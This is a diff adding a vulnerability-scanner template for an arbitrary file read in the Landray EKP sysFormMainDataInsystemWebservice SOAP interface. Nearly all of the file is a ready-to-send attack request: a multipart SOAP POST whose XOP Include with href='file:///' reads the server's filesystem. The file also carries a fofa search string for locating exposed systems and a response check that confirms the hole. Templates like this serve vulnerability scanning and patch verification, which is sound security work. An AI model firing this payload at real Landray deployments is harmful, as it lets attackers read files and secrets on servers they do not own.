@@ -1,0 +1,50 @@
+id: landray-ekp-sysFormMainDataInsystemWebservice-fileread
+
+info:
+  name: Landray EKP sysFormMainDataInsystemWebservice File Read
+  author: ZacharyZcR
+  severity: high
+  verified: true
+  description: |-
+    Landray EKP System sysFormMainDataInsystemWebservice interface has an arbitrary file read vulnerability.
+    fofa: body="Com_Parameter"
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8CEKP%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3sysFormMainDataInsystemWebservice%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  tags: landray,fileread
+  created: 2024/12/30
+
+set:
+  rboundary: randomLowercase(8)
+  hostname: request.url.host
+
+rules:
+  r0:
+    request:
+      raw: |-
+        POST /sys/webservice/sysFormMainDataInsystemWebservice HTTP/1.1
+        Host: {{hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
+        Connection: close
+        Content-Type: multipart/related; boundary=----{{rboundary}}
+        SOAPAction: 
+        Accept-Encoding: gzip, deflate
+
+        ------{{rboundary}}
+        Content-Disposition: form-data; name="a"
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.maindata.xform.sys.kmss.landray.com/">
+        <soapenv:Header/>
+        <soapenv:Body>
+            <web:getData>
+                <arg0>
+                    <beginTimeStamp>a</beginTimeStamp>
+                    <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///"/></count>
+                </arg0>
+            </web:getData>
+        </soapenv:Body>
+        </soapenv:Envelope>
+        ------{{rboundary}}--
+    expression: |
+      response.status == 500 &&
+      response.body.ibcontains(b'Unmarshalling Error:')
+expression: r0()
